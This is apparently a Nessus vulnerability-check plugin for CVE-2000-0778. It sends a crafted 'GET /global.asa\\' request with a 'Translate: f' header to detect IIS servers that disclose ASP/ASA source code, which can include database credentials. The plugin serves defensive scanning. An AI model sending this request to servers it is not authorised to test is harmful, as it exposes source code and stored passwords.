#
# This script was written by Alexander Strouk
#
# See the Nessus Scripts License for details
#
#
if(description)
{
 script_id(10491); 
 script_bugtraq_id(1578);
 script_version ("$Revision: 1.17 $");
 script_cve_id("CVE-2000-0778");
 name["english"] = "ASP/ASA source using Microsoft Translate f: bug";
 script_name(english:name["english"]);
 
 desc["english"] = "
There is a serious vulnerability in Windows 2000 (unpatched by SP1) that 
allows an attacker to view ASP/ASA source code instead of a processed file.

ASP source code can contain sensitive information such as username's and 
passwords for ODBC connections.

Solution : install all the latest Microsoft Security Patches (Note: This 
vulnerability is eliminated by installing Windows 2000 Service Pack 1)

 Risk factor : High";

 script_description(english:desc["english"]);
 summary["english"] = "downloads the source of IIS scripts such as ASA,ASP";
 script_summary(english:summary["english"]);
 script_category(ACT_GATHER_INFO);
 copyright="This script is Copyright (C) 2000 Alexander Strouk";
 script_copyright(english:copyright);
 script_family(english:"CGI abuses");
 script_dependencie("find_service.nes", "no404.nasl", "http_version.nasl", "www_fingerprinting_hmap.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_http_port(default:80);
if  (! port || get_kb_item("Services/www/" + port + "/embedded") ) exit(0);

sig = get_kb_item("www/hmap/" + port + "/description");
if ( sig && "IIS" >!< sig ) exit(0);
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  req = string("GET /global.asa\\ HTTP/1.0\nTranslate: f\r\n\r\n");
  send(socket:soc, data:req);
  r = http_recv_headers2(socket:soc);
  if( r == NULL ) exit(0);
  if("Content-Type: application/octet-stream" >< r)security_hole(port);
  close(soc);
 }
}

